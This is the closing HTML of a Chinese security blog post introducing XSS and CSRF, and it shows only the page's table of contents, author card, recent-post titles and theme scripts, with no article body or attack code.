+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://xilitter.github.io">XiLitter</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xilitter.github.io/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/">https://xilitter.github.io/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xilitter.github.io" target="_blank">XiLitter</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CSRF/">CSRF</a><a class="post-meta__tags" href="/tags/XSS/">XSS</a></div><div class="post_share"><div class="social-share" data-image="/img/art01.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/02/19/VNCTF2023web%E5%A4%8D%E7%8E%B0/" title="VNCTF2023web复现"><img class="cover" src="/img/art/a2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">VNCTF2023web复现</div></div></a></div><div class="next-post pull-right"><a href="/2023/02/14/NSSRound-8-Basic%E8%AE%B0%E5%BD%95/" title="NSSRound#8 Basic记录"><img class="cover" src="/img/art/a5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">NSSRound#8 Basic记录</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">XiLitter</div><div class="author-info__description">且视他人之疑目如盏盏鬼火，大胆去走你的夜路。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiLitter"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XiLitter" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/3336741183@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">换博客主题了，感觉还是这个主题更好看，而且功能也多，但是好多功能暂且没设置，以后再弄。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%85%E8%AF%B4XSS"><span class="toc-number">1.</span> <span class="toc-text">浅说XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.2.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-XSS"><span class="toc-number">1.3.</span> <span class="toc-text">存储型 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">1.4.</span> <span class="toc-text">DOM型XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%85%E8%AF%B4CSRF"><span class="toc-number">2.</span> <span class="toc-text">浅说CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-number">2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E9%98%B2%E5%BE%A1"><span class="toc-number">2.2.</span> <span class="toc-text">CSRF防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Listener内存马"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java内存马连续剧——Listener内存马"/></a><div class="content"><a class="title" href="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Listener内存马">java内存马连续剧——Listener内存马</a><time datetime="2023-08-19T08:46:50.000Z" title="发表于 2023-08-19 16:46:50">2023-08-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Filter内存马"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java内存马连续剧——Filter内存马"/></a><div class="content"><a class="title" href="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Filter内存马">java内存马连续剧——Filter内存马</a><time datetime="2023-08-16T15:14:13.000Z" title="发表于 2023-08-16 23:14:13">2023-08-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Evilbox打靶记录"><img src="/img/art/a7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Evilbox打靶记录"/></a><div class="content"><a class="title" href="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Evilbox打靶记录">Evilbox打靶记录</a><time datetime="2023-08-15T10:18:04.000Z" title="发表于 2023-08-15 18:18:04">2023-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Struts2-S2-001漏洞复现"><img src="/img/art/a4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Struts2-S2-001漏洞复现"/></a><div class="content"><a class="title" href="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Struts2-S2-001漏洞复现">Struts2-S2-001漏洞复现</a><time datetime="2023-08-13T02:16:21.000Z" title="发表于 2023-08-13 10:16:21">2023-08-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/" title="Log4j2 JNDI注入漏洞(CVE-2021-44228)"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Log4j2 JNDI注入漏洞(CVE-2021-44228)"/></a><div class="content"><a class="title" href="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/" title="Log4j2 JNDI注入漏洞(CVE-2021-44228)">Log4j2 JNDI注入漏洞(CVE-2021-44228)</a><time datetime="2023-08-01T07:50:03.000Z" title="发表于 2023-08-01 15:50:03">2023-08-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/art01.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By XiLitter</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
